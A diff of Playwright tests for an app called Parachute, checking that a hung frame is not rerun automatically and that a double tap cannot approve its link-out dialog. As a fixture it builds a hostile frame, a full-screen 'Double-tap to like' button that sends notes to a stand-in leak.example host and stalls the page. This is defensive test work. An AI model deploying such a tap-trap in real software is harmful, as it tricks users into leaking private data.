@@ -145,9 +145,6 @@ export default function Leaky() {
   await ui(page).getByRole("button", { name: "Go" }).click();
   const ask = page.getByRole("dialog", { name: "Open outside Parachute" });
   await expect(ask).toContainText("https://leak.example/?notes=all-of-them");
-  // a tap on Open straight after it appeared (a double tap's second tap) doesn't answer it
-  await ask.getByRole("button", { name: "Open" }).click();
-  await expect(ask).toBeVisible();
   await ask.getByRole("button", { name: "Cancel" }).click();
   await expect(ask).toHaveCount(0);
   await page.waitForTimeout(500);
@@ -170,8 +167,41 @@ test("a frame that stopped the app gives way to the built-in one at the next sta
   // (put there before the app starts: leaving the page normally clears it, which a hung page can't do)
   await page.addInitScript(() => { try { const k = JSON.parse(localStorage.getItem("parachute.frames.v1") ?? "{}"); if (k.approved) { k.starting = k.approved.hash; localStorage.setItem("parachute.frames.v1", JSON.stringify(k)); } } catch { /* the sealed frame has no storage */ } });
   await page.reload();
+  // it doesn't run again by itself: its card asks, and says why
+  await expect(page.getByRole("heading", { name: "Use your frame again?" })).toBeVisible();
+  await expect(page.getByText("Parachute stopped while your frame was showing")).toBeVisible();
+  await expect(frameEl(page)).toHaveCount(0);
+  await page.getByRole("button", { name: "Use the built-in frame" }).click();
   await expect(frameEl(page)).toHaveAttribute("data-frame", "built-in");
-  await page.goto("/settings");
-  await expect(status(page)).toHaveText("The built-in frame runs: your frame stopped.");
-  await expect(page.getByText("stopped the app last time")).toBeVisible();
+});
+
+test("a double tap can't answer the link-out question, even when the frame holds the page up between the taps", async ({ page }) => {
+  test.setTimeout(60_000);
+  await write(`import { call } from "@parachute/frame";
+export default function Trap() {
+  return <button style={{ position: "fixed", inset: 0, width: "100%", height: "100%" }} onClick={() => { void call("link.out", { url: "https://leak.example/?notes=secret" }); setTimeout(() => { const t0 = Date.now(); while (Date.now() - t0 < 900) {} }, 4); }}>Double-tap to like</button>;
+}`);
+  const hits: string[] = [];
+  await page.context().route(/leak\.example/, (r) => { hits.push(r.request().url()); return r.fulfill({ body: "x" }); });
+  await page.goto("/");
+  await page.getByRole("button", { name: "Use it" }).click();
+  const trap = ui(page).getByRole("button", { name: "Double-tap to like" });
+  await expect(trap).toBeVisible();
+  // where Open will be: ask once, look, cancel, and wait out the rest
+  await trap.click();
+  const ask = page.getByRole("dialog", { name: "Open outside Parachute" });
+  const box = (await ask.getByRole("button", { name: "Open" }).boundingBox())!;
+  await ask.getByRole("button", { name: "Cancel" }).click();
+  await page.waitForTimeout(6_500);
+  // the double tap on that spot: the first asks (and the frame stalls), the second lands where Open now is
+  const x = box.x + box.width / 2, y = box.y + box.height / 2;
+  const first = page.mouse.click(x, y);
+  await page.waitForTimeout(150);
+  await Promise.all([first, page.mouse.click(x, y)]);
+  await page.waitForTimeout(1_000);
+  expect(hits).toEqual([]);
+  await expect(ask).toContainText("https://leak.example/?notes=secret");
+  // the person reads it and taps Open: that opens
+  await ask.getByRole("button", { name: "Open" }).click();
+  await expect.poll(() => hits.length).toBe(1);
 });
